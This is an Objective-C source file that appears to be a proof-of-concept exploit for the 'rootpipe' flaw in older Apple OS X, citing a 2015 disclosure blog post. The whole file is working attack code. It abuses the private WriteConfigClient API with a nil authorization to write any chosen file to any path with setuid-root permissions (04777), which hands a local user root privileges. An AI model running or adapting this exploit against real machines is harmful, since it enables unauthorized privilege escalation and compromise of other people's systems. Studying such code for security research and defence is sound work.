#import <Foundation/Foundation.h>

#import <objc/runtime.h>

// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/

int main_ap(int argc, const char *argv[])
{
	Class writeConfigClient = (Class)objc_lookUpClass("WriteConfigClient");
	
	if (!writeConfigClient)
		return EXIT_FAILURE;
	
	if (![writeConfigClient respondsToSelector:NSSelectorFromString(@"sharedClient")])
		return EXIT_FAILURE;
	
	id sharedClient = [writeConfigClient performSelector:NSSelectorFromString(@"sharedClient")];
	
	if (!sharedClient)
		return EXIT_FAILURE;
	
	[sharedClient performSelector:NSSelectorFromString(@"authenticateUsingAuthorizationSync:") withObject:nil];
	
	id tool = [sharedClient performSelector:NSSelectorFromString(@"remoteProxy")];
	
	SEL selector = NSSelectorFromString(@"createFileWithContents:path:attributes:");
	
	NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:[tool methodSignatureForSelector:selector]];
	
	[invocation setTarget:tool];
	[invocation setSelector:selector];
	[invocation setArgument:[NSData dataWithContentsOfFile:@(argv[1])] atIndex:2];
	[invocation setArgument:@(argv[2]) atIndex:3];
	[invocation setArgument:@{ NSFilePosixPermissions: @04777 } atIndex:4];
	
	[invocation invoke];
	
	return EXIT_SUCCESS;
}

int main(int argc, const char *argv[])
{
	if (argc != 3)
	{
		fprintf(stderr, "Usage: rootpipe source target\n");
		
		return EXIT_FAILURE;
	}
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	int retcode = main_ap(argc, argv);
	
	[pool drain];
	
	return retcode;
}
